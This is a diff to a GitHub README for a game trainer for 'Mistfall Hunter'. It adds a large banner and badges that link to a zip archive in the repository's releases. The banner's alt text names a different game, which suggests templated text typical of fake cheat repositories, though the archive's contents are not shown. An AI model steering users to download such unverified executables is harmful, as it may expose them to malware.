@@ -2,6 +2,19 @@
 
 Enhance your single-player experience with a lightweight and easy-to-use trainer for **Mistfall Hunter**.
 
+<p align="center">
+  <b>⬇ Click the banner below to download the latest version ⬇</b>
+</p>
+
+<p align="center">
+    <a href="https://github.com/Speedatpinpoint/Mistfall-Hunter-Trainer/releases/latest/download/MistfallHunter.zip">
+        <img src="assets/banner.png" width="100%" alt="Download DragonSword: Awakening Trainer">
+    </a>
+</p>
+
+[![Download](https://img.shields.io/badge/DOWNLOAD-LATEST_VERSION-8A2BE2?style=for-the-badge)](https://github.com/Speedatpinpoint/Mistfall-Hunter-Trainer/releases/latest/download/MistfallHunter.zip)
+![Stars](https://img.shields.io/github/stars/Speedatpinpoint/Mistfall-Hunter-Trainer?style=for-the-badge)
+
 > **For educational purposes only. Use in offline/single-player modes.**
 
 ---
